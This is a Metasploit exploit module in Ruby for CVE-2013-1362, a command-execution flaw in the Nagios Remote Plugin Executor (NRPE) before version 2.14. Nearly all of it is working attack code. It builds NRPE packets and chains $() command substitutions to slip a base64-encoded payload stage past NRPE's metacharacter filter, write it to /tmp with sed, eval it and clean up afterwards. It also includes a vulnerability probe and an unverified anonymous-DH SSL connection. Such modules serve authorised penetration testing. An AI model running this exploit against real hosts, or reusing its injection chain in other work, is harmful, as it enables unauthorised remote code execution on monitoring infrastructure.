##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
#

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Nagios Remote Plugin Executor Arbitrary Command Execution',
      'Description' => %q{
          The Nagios Remote Plugin Executor (NRPE) is installed to allow a central
        Nagios server to actively poll information from the hosts it monitors. NRPE
        has a configuration option dont_blame_nrpe which enables command-line arguments
        to be provided remote plugins. When this option is enabled, even when NRPE makes
        an effort to sanitize arguments to prevent command execution, it is possible to
        execute arbitrary commands.
      },
      'Author'      =>
        [
          'Rudolph Pereir', # Vulnerability discovery
          'jwpari <jwpari[at]beersec.org>' # Independently discovered and Metasploit module
        ],
      'References'  =>
        [
          [ 'CVE', '2013-1362' ],
          [ 'OSVDB', '90582'],
          [ 'BID', '58142'],
          [ 'URL', 'http://www.occamsec.com/vulnerabilities.html#nagios_metacharacter_vulnerability']
        ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Payload'     =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'perl python ruby bash telnet',
              # *_perl, *_python and *_ruby work if they are installed
            }
        },
      'Targets'     =>
        [
          [ 'Nagios Remote Plugin Executor prior to 2.14', {} ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Feb 21 2013'
    ))

    register_options(
      [
        Opt::RPORT(5666),
        OptEnum.new('NRPECMD', [
          true,
          "NRPE Command to exploit, command must be configured to accept arguments in nrpe.cfg",
          'check_procs',
          ['check_procs', 'check_users', 'check_load', 'check_disk']
        ]),
        # Rex::Socket::Tcp will not work with ADH, see comment with replacement connect below
        OptBool.new('NRPESSL', [ true,  "Use NRPE's Anonymous-Diffie-Hellman-variant SSL ", true])
      ], self.class)
  end

  def send_message(message)
    packet = [
      2,       # packet version
      1,       # packet type, 1 => query packet
      0,       # checksum, to be added later
      0,       # result code, discarded for query packet
      message, # the command and arguments
      0        # padding
    ]
    packet[2] = Zlib::crc32(packet.pack("nnNna1024n")) # calculate the checksum
    begin
      self.sock.put(packet.pack("nnNna1024n")) #send the packet
      res = self.sock.get_once # get the response
    rescue ::EOFError => eof
      res = ""
    end

    return res.unpack("nnNnA1024n")[4] unless res.nil?
  end

  def setup
    @ssl_socket = nil
    @force_ssl = false
    super
  end

  def exploit

    if check != Exploit::CheckCode::Vulnerable
      fail_with(Exploit::Failure::NotFound, "Host does not support plugin command line arguments or is not accepting connections")
    end

    stage = "setsid nohup #{payload.encoded} & "
    stage = Rex::Text.encode_base64(stage)
    # NRPE will reject queries containing |`&><'\"\\[]{}; but not $() :)
    command = datastore['NRPECMD']
    command << "!"
    command << "$($(rm -f /tmp/$$)"   # Delete the file if it exists
    # need a way to write to a file without using redirection (>)
    # cant count on perl being on all linux hosts, use GNU Sed
    # TODO: Probably a better way to do this, some hosts may not have a /tmp
    command << "$(cp -f /etc/passwd /tmp/$$)" # populate the file with at least one line of text
    command << "$(sed 1i#{stage} -i /tmp/$$)" # prepend our stage to the file
    command << "$(sed q -i /tmp/$$)" # delete the rest of the lines after our stage
    command << "$(eval $(base64 -d /tmp/$$) )" # decode and execute our stage, base64 is in coreutils right?
    command << "$(kill -9 $$)" # kill check_procs parent (popen'd sh) so that it never executes
    command << "$(rm -f /tmp/$$))" # clean the file with the stage
    connect
    print_status("Sending request...")
    send_message(command)
    disconnect
  end

  def check
    print_status("Checking if remote NRPE supports command line arguments")

    begin
      # send query asking to run "fake_check" command with command substitution in arguments
      connect
      res = send_message("__fake_check!$()")
      # if nrpe is configured to support arguments and is not patched to add $() to
      # NASTY_META_CHARS then the service will return:
      #  NRPE: Command '__fake_check' not defined
      if res =~ /not defined/
        return Exploit::CheckCode::Vulnerable
      end
    # Otherwise the service will close the connection if it is configured to disable arguments
    rescue EOFError => eof
      return Exploit::CheckCode::Safe
    rescue Errno::ECONNRESET => reset
      unless datastore['NRPESSL'] or @force_ssl
        print_status("Retrying with ADH SSL")
        @force_ssl = true
        retry
      end
      return Exploit::CheckCode::Safe
    rescue => e
      return Exploit::CheckCode::Unknown
    end
    # TODO: patched version appears to go here
    return Exploit::CheckCode::Unknown

  end

  # NRPE uses unauthenticated Annonymous-Diffie-Hellman

  # setting the global SSL => true will break as we would be overlaying
  # an SSLSocket on another SSLSocket which hasnt completed its handshake
  def connect(global = true, opts={})

    self.sock = super(global, opts)

    if datastore['NRPESSL'] or @force_ssl
      ctx = OpenSSL::SSL::SSLContext.new("TLSv1")
      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
      ctx.ciphers = "ADH"

      @ssl_socket = OpenSSL::SSL::SSLSocket.new(self.sock, ctx)

      @ssl_socket.connect

      self.sock.extend(Rex::Socket::SslTcp)
      self.sock.sslsock = @ssl_socket
      self.sock.sslctx  = ctx
    end

    return self.sock
  end

  def disconnect
    @ssl_socket.sysclose if datastore['NRPESSL'] or @force_ssl
    super
  end

end
